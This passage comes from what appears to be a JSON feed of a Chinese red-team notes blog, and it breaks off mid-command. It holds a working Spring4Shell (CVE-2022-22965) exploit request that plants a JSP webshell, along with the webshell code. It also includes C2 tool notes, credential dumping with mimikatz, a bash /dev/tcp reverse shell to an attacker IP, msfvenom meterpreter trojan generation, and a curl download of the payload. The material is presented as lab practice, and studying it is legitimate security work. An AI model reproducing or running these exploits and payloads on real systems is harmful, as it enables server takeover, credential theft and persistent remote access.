<code>AccessLogValve</code>的属性，让Tomcat输出定制的”访问日志“，该“访问日志”实际上为一个JSP webshell。</p>\n<h4>漏洞复现</h4>\n<p><strong>环境搭建：</strong>(也可以直接使用vulhub)</p>\n<blockquote>\n<p>参考：<a href=\"https://github.com/wshon/spring-framework-rce\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub - wshon/spring-framework-rce: CVE-2022-22965</a></p>\n</blockquote>\n<p>本漏洞对各组件版本要求较高，基本要求：</p>\n<blockquote>\n<p>Spring Framework：5.3.0-5.3.17，5.2.0-5.2.19, 以及其他老版本</p>\n<p>tomcat8 &lt;=8.5.77, tomcat9 &lt;=9.0.61</p>\n<p>jdk &gt; 8</p>\n</blockquote>\n<p>本次演示环境如下：</p>\n<figure><figcaption>image-20230524111054821</figcaption></figure>\n<blockquote>\n<p>代码地址：实验室培训\\spring\\code\\4-CVE-2022-22965（github直接下载的不太对）</p>\n</blockquote>\n<ol>\n<li>mvn package 打war包，将war包重名为<code>ROOT.war</code>(这里是为了和vulhub发送的攻击报文一样，才改成了ROOT。不重命名也可以，只要把下面请求包里的webapps/ROOT字段中的ROOT修改为war包的名字即可)</li>\n<li>清空tomcat的webapps目录，将上面的war包放入该目录（tomcat默认托管这个目录，不想放在这里可以的话，需要去修改配置文件conf/server.xml）</li>\n<li>进入tomcat的bin目录，用管理员身份执行<code>catalina.bat run</code></li>\n</ol>\n<p>**漏洞复现：**发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件：</p>\n<div class=\"language-http\" data-ext=\"http\" data-title=\"http\"><pre class=\"language-http\"><code><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">127.0.0.1:8080</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">*/*</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">en</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) \tAppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 \t\tSafari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">suffix</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">%&gt;//</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">c1</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Runtime</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">c2</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">&lt;%</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">DNT</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n\n\n</code></pre></div><p>ROOT目录下就会出现一个jsp文件，这就是写入的webshell。</p>\n<figure><figcaption>image-20230524110228934</figcaption></figure>\n<p>然后访问/tomcatwar.jsp?pwd=j&amp;cmd=  即可执行命令。</p>\n<figure><figcaption>image-20230524111204263</figcaption></figure>\n<p>注意，需要在利用完成后将<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>清空，否则每次请求都会写入新的恶意代码在JSP Webshell中，导致这个文件变得很大。发送如下数据包将其设置为空：</p>\n<div class=\"language-http\" data-ext=\"http\" data-title=\"http\"><pre class=\"language-http\"><code><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">localhost:8080</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">*/*</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">en</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span>\n\n\n</code></pre></div><p>总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。</p>\n<h4>POC分析</h4>\n<p>参数绑定的实现方式：如果用户传入name=zzz，则Spring框架会自动调用<code>user.setName(‘zzz’)</code>进行赋值,，然后<code>user.getName()</code>返回name。 如果提交的参数中出现了User类的一个public字段或方法，就自动用户提交请求给他赋值。</p>\n<p><code>name</code>自动绑定到了<code>user</code>参数的<code>name</code>属性上，<code>age</code>自动绑定到了<code>user</code>参数的<code>age</code>属性上。</p>\n<figure><figcaption>image-20230524152630613</figcaption></figure>\n<figure><figcaption>image-20230524152442641</figcaption></figure>\n<figure><figcaption>image-20230524152944799</figcaption></figure>\n<p>给这个doBind方法传恶意参数，即POC中的各个参数，对POC中的参数URL解码后可以拆分成如下5对参数。</p>\n<p><strong><code>pattern</code>参数</strong></p>\n<ul>\n<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code></li>\n<li>参数值：<code>%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i</code></li>\n</ul>\n<p>很明显，这个参数是SpringMVC多层嵌套参数绑定。我们可以推测出如下的调用链：</p>\n<div class=\"language-Java\" data-ext=\"Java\" data-title=\"Java\"><pre class=\"language-Java\"><code>User.getClass()\n    java.lang.Class.getModule()\n        ......\n            SomeClass.setPattern()\n</code></pre></div><p>那实际运行过程中的调用链是怎样的呢？<code>SomeClass</code>是哪个类呢？</p>\n<p><strong>断点位置：</strong></p>\n<ul>\n<li>\n<p>在实现SpringMVC参数绑定的主要方法<code>WebDataBinder.doBind(MutablePropertyValues)</code>上设置断点。</p>\n</li>\n<li>\n<p><code>AbstractNestablePropertyAccessor</code>的<code>getPropertyAccessorForPropertyPath(String)</code>方法。该方法通过递归调用自身，实现对<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>的递归解析，设置整个调用链。</p>\n</li>\n<li>\n<p>在<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>设置断点，该行主要实现每层嵌套参数的获取。查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。</p>\n</li>\n<li>\n<p><code>BeanWrapperImpl</code>的<code>BeanPropertyHandler.getValue()</code>方法中。可以看到<code>class</code>嵌套参数最终通过反射调用<code>User</code>的父类<code>java.lang.Object.getClass()</code>，获得返回<code>java.lang.Class</code>实例。</p>\n</li>\n</ul>\n<p>需要调用很多轮，最终看出调用链：</p>\n<div class=\"language-Java\" data-ext=\"Java\" data-title=\"Java\"><pre class=\"language-Java\"><code>User.getClass()\n    java.lang.Class.getModule()\n        java.lang.Module.getClassLoader()\n            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()\n                org.apache.catalina.webresources.StandardRoot.getContext()\n                    org.apache.catalina.core.StandardContext.getParent()\n                        org.apache.catalina.core.StandardHost.getPipeline()\n                            org.apache.catalina.core.StandardPipeline.getFirst()\n                                org.apache.catalina.valves.AccessLogValve.setPattern()\n</code></pre></div><p>可以看到，<code>pattern</code>参数最终对应<code>AccessLogValve.setPattern()</code>，即将<code>AccessLogValve</code>的<code>pattern</code>属性设置为如下符合access_log的文件内容的格式。</p>\n<blockquote>\n<p>具体格式可以参考https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</p>\n</blockquote>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i\n</code></pre></div><p>攻击报文中的如下内容的添加也是为了符合access_log格式。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>suffix: %&gt;//\nc1: Runtime\nc2: &lt;%\nDNT: 1\n</code></pre></div><p>最终的jsp马如下：(图中为了清楚，使用vscode格式化了一下)</p>\n<figure><figcaption>image-20230524145857077</figcaption></figure>\n<p><strong><code>suffix</code>参数</strong></p>\n<ul>\n<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code></li>\n<li>参数值：<code>.jsp</code></li>\n</ul>\n<p>按照<code>pattern</code>参数相同的调试方法，<code>suffix</code>参数最终将<code>AccessLogValve.suffix</code>设置为<code>.jsp</code>，即access_log的文件名后缀。</p>\n<p><strong><code>directory</code>参数</strong></p>\n<ul>\n<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.directory</code></li>\n<li>参数值：<code>webapps/ROOT</code></li>\n</ul>\n<p>按照<code>pattern</code>参数相同的调试方法，<code>directory</code>参数最终将<code>AccessLogValve.directory</code>设置为<code>webapps/ROOT</code>，即access_log的文件输出目录。</p>\n<p>这里提下<code>webapps/ROOT</code>目录，该目录为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过<code>http://localhost:8080/</code>根目录访问。</p>\n<p><strong><code>prefix</code>参数</strong></p>\n<ul>\n<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.prefix</code></li>\n<li>参数值：<code>tomcatwar</code></li>\n</ul>\n<p>按照<code>pattern</code>参数相同的调试方法，<code>prefix</code>参数最终将<code>AccessLogValve.prefix</code>设置为<code>tomcatwar</code>，即access_log的文件名前缀。</p>\n<p><strong><code>fileDateFormat</code>参数</strong></p>\n<ul>\n<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</code></li>\n<li>参数值：空</li>\n</ul>\n<p>按照<code>pattern</code>参数相同的调试方法，<code>fileDateFormat</code>参数最终将<code>AccessLogValve.fileDateFormat</code>设置为空，即access_log的文件名不包含日期。</p>\n<h4>漏洞利用关键点</h4>\n<ul>\n<li>\n<p>Web应用部署方式需要是Tomcat war包部署：从<code>java.lang.Module</code>到<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，是将调用链转移到Tomcat，并最终利用<code>AccessLogValve</code>输出webshell，而<code>ParallelWebappClassLoader</code>在Web应用以war包部署到Tomcat中时使用到。</p>\n</li>\n<li>\n<p>在前面的第三个断点也就是<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>处，在JDK 1.9之后，Java为了支持模块化，在<code>java.lang.Class</code>中增加了<code>module</code>属性和对应的<code>getModule()</code>方法，此时才能实现漏洞利用，以前的版本不支持。</p>\n</li>\n<li>\n<p>某些版本的tomcat也不支持此利用链，不同版本的组合结果也不同，测试结果如下：</p>\n\n</li>\n</ul>\n<p>安全起见，升级Spring到5.3.18以上版本，tomcat到9.0.62以上版本。</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "命令执行_spring_CVE-2018-1273_Spring_Data_Commons远程命令执行漏洞（利用方式二可绕过）",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/spring/spring_CVE-2018-1273_bypass.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/spring/spring_CVE-2018-1273_bypass.html",
      "summary": "命令执行_spring_CVE-2018-1273_Spring_Data_Commons远程命令执行漏洞（利用方式二可绕过）\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\nNVD (nist.gov)\n\n\nSpring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。Spring D...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：Supervisord 远程命令执行漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/supervisor/supervisor_CVE-2017-11610.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/supervisor/supervisor_CVE-2017-11610.html",
      "summary": "漏洞名称：Supervisord 远程命令执行漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\n\nSupervisord是Supervisor的服务端程序，是一款用Python语言开发的管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。\nSupervisord曾曝出了一个需认证的远程命令执行漏洞（CVE-2017-1...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "漏洞名称：XStream 反序列化命令执行漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/xstream/xstream_CVE-2021-21351.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/xstream/xstream_CVE-2021-21351.html",
      "summary": "漏洞名称：XStream 反序列化命令执行漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\n\nXStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。XStream是自由软件，可以在BSD许可证的许可下分发。它是一种OXMapping 技术，是用来处理XML文件序列化的框架在将javaBean序列化，或...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "C3（Custom Command and Control）使用",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/C3.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/C3.html",
      "summary": "C3（Custom Command and Control）使用\n翻译了官网对一些术语的定义：\n\nRelays（中继） – 在受感染的主机上启动的可执行文件。中继通过接口在彼此之间或返回到网关进行通信。\nGateway（网关） – 一种控制一个 C3 网络的特殊继电器。如果没有可运行的网关，C3 网络就无法运行。网关是从中继返回攻击者基础设施的桥梁。网...",
      "content_html": "\n<p>翻译了官网对一些术语的定义：</p>\n<ul>\n<li>Relays（中继） – 在受感染的主机上启动的可执行文件。中继通过接口在彼此之间或返回到网关进行通信。</li>\n<li>Gateway（网关） – 一种控制一个 C3 网络的特殊继电器。如果没有可运行的网关，C3 网络就无法运行。网关是从中继返回攻击者基础设施的桥梁。网关还负责与第三方 C2 服务器（例如 Cobalt Strike 的 Teamserver）进行通信。</li>\n<li>Channels（通道） - 中继之间传递数据的商定方案。例如 Slack 的 API。</li>\n<li>Gateway Return Channel (网关返回通道 GRC)  - 中继将用于将数据发送回网关的已配置通道。请注意，GRC 可能是经过另一个中继的路由。</li>\n<li>Interfaces（接口）— 一个高级名称，指的是有助于在 C3 网络内发送和接收数据的任何事物。</li>\n<li>Routes（路由） – 跨中继返回网关的预期通信路径。</li>\n<li>Peripheral（外围设备） – 命令和控制框架的第三方植入。外设通过“控制器”与其本机控制器通信。例如，Cobalt Strike 的 SMB 信标。</li>\n<li>Connector（连接器）– 与第三方命令和控制框架的集成。例如，Cobalt Strike 的 Teamserver 通过 externalc2_start 命令公开的“外部 C2”接口。</li>\n</ul>\n<p>网管配置：选择好后点击<code>创建和下载网关</code>，浏览器会去下载一个名为<code>Gateway_YourName</code>的压缩包</p>\n<figure><figcaption>image-20230925092449871</figcaption></figure>\n<p>解压后双击exe</p>\n<figure><figcaption>image-20230925093751070</figcaption></figure>\n<p>IP和端口可以再这里改</p>\n<figure><figcaption>image-20230925093858552</figcaption></figure>\n<p>网关就起来了</p>\n<figure><figcaption>image-20230925093953085</figcaption></figure>\n<figure><figcaption>image-20230925100656583</figcaption></figure>\n<p><strong>连接CS的Teamserver</strong></p>\n<p>双击网关的图标，选择“命令中心”按钮</p>\n<figure><figcaption>image-20230925102043715</figcaption></figure>\n<ul>\n<li>在“选择命令”下拉列表中，选择一个命令，这里选择了<code>TurnOnConnectorTeamServer</code>，填写TeamServer的IP和端口</li>\n</ul>\n<figure><figcaption>image-20230925102003634</figcaption></figure>\n<p>填写好后点<code>Send Command</code>，结果如下（若右侧的Auto Update没打开，需要刷新一下浏览器页面才可以看到）</p>\n<figure><figcaption>image-20230925102309309</figcaption></figure>\n<figure><figcaption>image-20230925155816200</figcaption></figure>\n<figure><figcaption>image-20230925155847951</figcaption></figure>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "CS",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/CS.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/CS.html",
      "summary": "CS\nCS梼杌插件里两个抓密码功能区别\nMimikatz Logon Passwords ：内存加载mimikatz到目标主机，然后执行sekurlsa::logonpasswords\nDumpLsass SharpDump：先内存加载一个SharpDump.exe，然后调用rundll32执行，把从内存里抓到的内容保存在xxx.out文件里，然后gz...",
      "content_html": "\n<h3>CS梼杌插件里两个抓密码功能区别</h3>\n<p><code>Mimikatz Logon Passwords</code> ：内存加载mimikatz到目标主机，然后执行<code>sekurlsa::logonpasswords</code></p>\n<p><code>DumpLsass SharpDump</code>：先内存加载一个SharpDump.exe，然后调用rundll32执行，把从内存里抓到的内容保存在xxx.out文件里，然后gz压缩成.bin文件，这个文件会留在靶机上，下载下来解压，用mimakatz读就行了。</p>\n<figure><figcaption>image-20240715154133457</figcaption></figure>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "MSF使用手册",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/MSFUse.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/MSFUse.html",
      "summary": "MSF使用手册\nMSF简介\nMetasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。\nMetasploit通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块...",
      "content_html": "\n<h3>MSF简介</h3>\n<p>Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。</p>\n<p>Metasploit通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、 Post模块等。 Metasploit还有第三方程序的接口，例如Nmap、SQLMap 等，可以直接在控制台接口里使用。</p>\n<h3>MSF五大模块类型</h3>\n<ul>\n<li>Auxiliaries（辅助模块）\n该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</li>\n<li>Exploit（漏洞利用模块）\n漏洞利用是指由渗透测试者利用 一个系统、应用或者服务中的安全漏洞进行的攻击行为 。流行的渗透攻击技术包括缓冲区溢出、 Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。</li>\n<li>Payload（攻击载荷模块）\n攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入 。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等 。</li>\n<li>Post（后期渗透模块）\n该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</li>\n<li>Encoders（编码工具模块）\n该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、 IDS及类似的安全软件检测出来。</li>\n</ul>\n<h3>MSF渗透攻击步骤</h3>\n<p>使用MSF渗透测试时，可以综合使用以上模块，对目标系统进行侦察并发动攻击，大致的步骤如下所示。</p>\n<ol>\n<li>扫描目标机系统，寻找可用漏洞。</li>\n<li>选择并配置一个漏洞利用模块（exploit）。</li>\n<li>选择并配置一个攻击载荷模块（payload）。</li>\n<li>选择一个编码技术，用来绕过杀毒软件的查杀 。</li>\n<li>渗透攻击。</li>\n</ol>\n<h3>MSF启动、退出、更新</h3>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>msfconsole：启动MSF框架。\nexit：退出MSF框架。也可以使用快捷键Ctrl+\\。\nback：退出到上一级。\napt-get update ：同步 /etc/apt/sources.list 和 /etc/apt/sources.list.d 中列出的源的索引，这样才能获取到最新的软件包。 。\napt install metasploit-framework：更新msf\n</code></pre></div><h3>主机扫描命令</h3>\n<p><strong>1. 使用辅助模块进行端口扫描</strong></p>\n<p>辅助模块auxiliary是MSF的内置模块，首先利用<code>search portscan</code>命令查询一下有哪些可用的端口扫描模块:</p>\n<figure><figcaption>1</figcaption></figure>\n<p>可以看到有8个可用的端口扫描模块，此处以tcp端口扫描模块为例进行扫描。输入命令<code>use auxiliary/scanner/portscan/tcp</code>进入对应模块（看&gt;号前面的内容就知道自己所处模块位置），再输入<code>show options</code>查询对应模块需要使用的参数。</p>\n<figure><figcaption>2</figcaption></figure>\n<p>在上述参数中，<strong>Required</strong>列被标记为<strong>yes</strong>的参数必须包含实际的值，其中除了<strong>RHOSTS</strong>外，其余参数均有默认值。<strong>THREADS</strong>设置扫描线程数量，默认为1，数量越高扫描越快。使用<code>set</code>命令设置某个参数值，可以使用<code>unset</code>命令取消某个参数值的设置，设置完毕后使用<code>run</code>命令执行模块，可以看到扫描结果如下：</p>\n<figure><figcaption>3</figcaption></figure>\n<p>其实还有两条可选命令：<code>setg</code>命令和<code>unsetg</code>命令 。二者用于在<strong>msfconsole</strong>中设置或者取消设置全局性的参数值，从而避免重复输入相同的值。例如可以全局设置<strong>LHOST</strong></p>\n<p><strong>2. 使用辅助模块进行服务扫描</strong></p>\n<p>在扫描目标机器上运行的服务时，有多种基于服务的扫描技术可供选择，例如VNC 、FTP 、SMB等，只需执行特定类型的扫描就可以发现服务。使用命令<code>search scanner</code>可以发现大量的扫描模块，约有600多个。</p>\n<p><code>search _version</code> //扫描服务版本的各种模块</p>\n<p><code>search _login</code> //查看所有服务登录口令探测模块</p>\n<p><code>search scanner/**</code>       //搜索与**服务相关的模块。</p>\n<p>**Telnet服务扫描 **</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>search scanner/telnet\nuse auxiliary/scanner/telnet/telnet_login     //telent登录 \nuse auxiliary/scanner/telnet/telnet_version   //telent版本\nset RHOSTS xxxx/24 \nset THREADS 100 \nrun/exploit \n</code></pre></div><p><strong>SSH服务扫描</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>use auxiliary/scanner/ssh/ssh_login //ssh登录\nuse auxiliary/scanner/ssh/ssh_login_pubkey //ssh公共密钥认证登录\nuse auxiliary/scanner/ssh/ssh_version //扫描ssh版本\n</code></pre></div><figure><figcaption>4</figcaption></figure>\n<p>Oracle数据库扫描</p>\n<p>SMB服务扫描</p>\n<p>MSSQL服务扫描</p>\n<p>FTP扫描</p>\n<p>SMTP扫描</p>\n<p>SNMP扫描</p>\n<p>MSF端口扫描</p>\n<p><strong>wmap</strong>  Web应用辅助扫描，漏洞查找等模块基本都在 modules/auxiliary/ 下， Metasploit内置了wmap WEB扫描器 要先创建一个数据库用来存放扫描数据，初始化wmap</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>wmap_sites -a http://202.112.50.74 // 添加要扫描的网站\nwmap_sites -l\nwmap_targets -t http://202.112.20.74 // 把添加的网站作为扫描目标\nwmap_run -t   // 查看那些模块将在扫描中使用\nwmap_run -e   // 开始扫描\nvulns     // 查看漏洞信息\n</code></pre></div><p><strong>3.使用 Nmap 扫描</strong></p>\n<p>在MSF框架中可以直接使用Nmap，输入命令<code>nmap -A 192.168.1.7</code>对靶机进行全面扫描，</p>\n<h3>MSF权限维持</h3>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>use exploit/windows/local/persistence_service\n</code></pre></div><h3>攻防演练MSF的一些命令</h3>\n<h4>MSF管理shell</h4>\n<p>手动反弹shell</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>msf6 &gt; use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 100.1.1.169\nlhost =&gt; 100.1.1.169\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 100.1.1.169:4444\n</code></pre></div><p>然后在已经拿到的靶机shell输入：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>bash -i &gt;&amp; /dev/tcp/100.1.1.169/4444 0&gt;&amp;1\n</code></pre></div><p>然后可以把权限修改为meterpreter（^Z表示ctrl+Z）</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>root@web01:/home/mason# ^Z\nBackground session 1? [y/N]  y\nmsf6 exploit(multi/handler) &gt; use post/multi/manage/shell_to_meterpreter \nmsf6 post(multi/manage/shell_to_meterpreter) &gt; set session 1\nsession =&gt; 1\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; run\n\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 100.1.1.169:4433 \n[*] Sending stage (980808 bytes) to 192.168.0.51\n[*] Meterpreter session 2 opened (100.1.1.169:4433 -&gt; 192.168.0.51:52976) at 2022-12-05 11:32:18 +0800\n[*] Post module execution completed\n\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nroot@web01:/home/mason# \nroot@web01:/home/mason# ^Z\nBackground session 1? [y/N]  y\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter &gt; \n</code></pre></div><p>可以看出session1是shell，session2是meterpreter。</p>\n<h3>利用木马获得meterperter</h3>\n<p>为了防止ssh连接超时终端，可以上传后门文件并持续运行，生成木马命令：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>msf5: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=100.1.1.169 LPORT=7777 -f elf &gt; mshell.elf\nmsf6: msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=100.1.1.169 LPORT=7777 -f elf &gt; mshell.elf\n</code></pre></div><p>然后起监听</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset lhost 100.1.1.169\nset lport 7777\nrun\n</code></pre></div><p>上传木马，这里选择在攻击机起http服务，然后靶机curl -o的方式</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>root@web01:/home/mason# curl http://100.1.1.169:8000/mshell.elf\nWarning: Binary output can mess up your terminal. Use \"--output -\" to tell \nWarning: curl to output it to your terminal anyway, or consider \"--output \nWarning: &lt;FILE&gt;\" to save to a file.\nroot@web01:/home/mason# curl http://100.1.1.169:8000/mshell.elf -o mshell.elf\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   250  100   250    0     0   8162      0 --:--:-- --:--:-- --:--:--  8333\nroot@web01:/home/mason# chmod 